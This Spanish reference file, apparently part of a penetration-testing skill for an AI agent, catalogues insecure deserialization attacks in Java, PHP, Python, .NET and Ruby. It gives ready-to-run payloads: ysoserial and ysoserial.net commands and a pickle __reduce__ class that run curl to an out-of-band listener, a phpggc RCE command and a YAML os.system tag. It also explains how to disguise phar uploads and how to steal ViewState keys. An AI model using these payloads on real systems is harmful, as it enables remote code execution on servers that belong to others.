# Deserialización insegura — catálogo por lenguaje

Cargar solo después de confirmar el formato del blob por magic
bytes/encoding (paso 1 del SKILL.md).

## Java — `ObjectInputStream` nativo

**Fingerprint**: base64 empezando con `rO0AB`, o bytes crudos `AC ED
00 05`. Header `Content-Type: application/x-java-serialized-object`
es confirmación directa si está presente.

**Herramienta**: [`ysoserial`](https://github.com/frohoff/ysoserial)
(binario Java, no hace falta compilar nada propio).

```bash
java -jar ysoserial.jar CommonsCollections6 'curl http://OOB-LISTENER/pwned' > payload.bin
# Enviar payload.bin como body/param/cookie según dónde se detectó el blob
```

**Orden de gadgets a probar** (de más universal a más específico —
parar en el primero que confirme):
1. `CommonsCollections3`/`CommonsCollections6` — Commons Collections es
   dependencia transitiva extremadamente común, buena primera apuesta
   incluso sin fingerprint de classpath.
2. `Spring1`/`Spring2` — si el fingerprint (headers, errores, paths)
   sugiere Spring Framework.
3. `ROME` — si hay indicios de procesamiento de RSS/Atom feeds.
4. `Groovy1` — si el stack usa Groovy (Grails, Jenkins).
5. `Jdk7u21`/`Jdk8u20` — gadgets que no dependen de ninguna librería
   externa, usan solo clases del JDK — probar si nada de lo anterior
   confirma y no hay más pistas de classpath.

Si hay acceso al fingerprint de dependencias (vía JS bundleado si es
una app híbrida, vía mensajes de error con nombres de paquete, vía
`/actuator` expuesto en Spring Boot con `dependencies` endpoint),
priorizar el gadget que matchee una librería confirmada en vez de
fuerza bruta por la lista completa.

**Confirmación preferida**: callback OOB (el comando del gadget hace
un `curl`/`nslookup` a un listener propio) — mucho menos invasivo que
apuntar directo a un reverse shell o escritura de archivo.

## PHP — `unserialize()`

**Fingerprint**: string empezando con `O:<número>:"<ClassName>"` (el
`O:` indica que lo serializado es un objeto, no un array/string/int
simple — `a:`/`s:`/`i:` solos no son interesantes para este vector).

**Requisito crítico**: `unserialize()` inseguro **no es explotable por
sí solo** — hace falta que exista, en el código de la app o sus
dependencias (vendor/), una clase con un método mágico peligroso
(`__wakeup()`, `__destruct()`, `__toString()`, `__call()`) que haga
algo explotable cuando se invoca sobre un objeto con propiedades
controladas por el atacante (POP chain — Property-Oriented
Programming).

**Cómo encontrar la POP chain:**
1. Si hay acceso al código fuente (repo público, `composer.lock`
   expuesto, `.git` filtrado): buscar clases con los métodos mágicos
   de arriba, trazar qué hacen con sus propiedades.
2. Si no hay acceso a código propio: revisar si el `composer.lock`
   lista frameworks/librerías con POP chains públicas documentadas
   (Laravel, Monolog, Guzzle, phpggc cubre varias — herramienta
   [`phpggc`](https://github.com/ambionics/phpggc) genera payloads
   para chains conocidas igual que ysoserial hace para Java).

```bash
phpggc Laravel/RCE1 'id' -b   # ejemplo, el gadget real depende de la versión detectada
```

**Variante phar deserialization**: si la app acepta un path de archivo
que termina pasando por una función que hace stat/file operations
(`file_exists`, `is_dir`, `fopen` con el PHP `phar://` wrapper), un
archivo `.phar` subido (disfrazado de imagen/documento, con magic
bytes correctos para el upload filter) puede disparar `unserialize()`
del metadata del phar sin llamar a `unserialize()` explícitamente en
el código — vector a tener presente si hay upload + alguna operación
de filesystem sobre el path subido después.

## Python — `pickle` y YAML inseguro

**Fingerprint pickle**: base64 empezando con `gASV` (protocolo 4/5) o
`KGRw` (protocolo 0, menos común hoy). Headers/params con nombres como
`state`, `session_data`, `cache` en apps Python son candidatos
frecuentes.

```python
import pickle, os, base64
class Exploit:
    def __reduce__(self):
        return (os.system, ('curl http://OOB-LISTENER/pwned',))
payload = base64.b64encode(pickle.dumps(Exploit()))
```

**Fingerprint YAML inseguro**: el blob YAML contiene tags explícitos
tipo `!!python/object:` o `!!python/object/apply:` — esto solo es
peligroso si el loader del lado server es `yaml.load()` sin
`Loader=yaml.SafeLoader` (o el default inseguro en versiones viejas de
PyYAML pre-5.1).

```yaml
!!python/object/apply:os.system ["curl http://OOB-LISTENER/pwned"]
```

## .NET — `BinaryFormatter`, `ObjectDataProvider`, ViewState

**Fingerprint**: parámetro/cookie con contenido base64 que al decodear
muestra strings de namespaces .NET (`System.`, nombres de ensamblados),
o directamente un campo `__VIEWSTATE` en un form ASP.NET WebForms.

**Herramienta**: [`ysoserial.net`](https://github.com/pwntester/ysoserial.net)
(equivalente .NET de ysoserial).

```bash
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -o base64 -c "curl http://OOB-LISTENER/pwned"
```

**ViewState específicamente**:
1. Confirmar si `EnableViewStateMac` está deshabilitado (ViewState
   forgeable directo, sin necesitar las keys) — señal: el ViewState
   decodeable sin error de MAC al mutarlo.
2. Si MAC está habilitado, se necesita `validationKey` y
   `decryptionKey` reales. Vías para obtenerlas: leak en
   `web.config` expuesto, key default conocida de versiones viejas de
   IIS/.NET mal configuradas, o — si hay otra vulnerabilidad de
   lectura de archivos — robarlas del filesystem.
3. Con las keys: `ysoserial.net --generator=ViewState --gadget=<gadget>
   --path="<ruta del endpoint>" --apppath="/" --decryptionalgorithm=...
   --decryptionkey=... --validationalgorithm=... --validationkey=...`
   (parámetros exactos dependen de la config detectada).

## Ruby — `Marshal.load`

**Fingerprint**: base64 empezando con `BAh` (versión de Marshal 4.8,
la más común).

**Gadget chains conocidas**: Rails ha tenido varios CVEs públicos en
este patrón (ej: gadgets vía `Gem::Requirement`, `ActiveSupport`
deserialization). Revisar la versión de Rails/gems contra CVEs
conocidos antes de intentar construir un gadget desde cero — la
mayoría de los casos explotables en el mundo real usan chains ya
documentadas, no gadgets originales armados a mano.

```ruby
# Patrón genérico con Gem::Requirement (versiones vulnerables de Rails)
# — el payload exacto depende del CVE específico que matchea la versión
```

## Nota general sobre herramientas

`ysoserial`, `ysoserial.net` y `phpggc` son las herramientas estándar
de la industria para esto — no reinventar gadgets a mano salvo que
ninguna herramienta cubra el caso específico. Documentar siempre qué
gadget/chain exacto se usó en el finding, no solo "usé ysoserial".
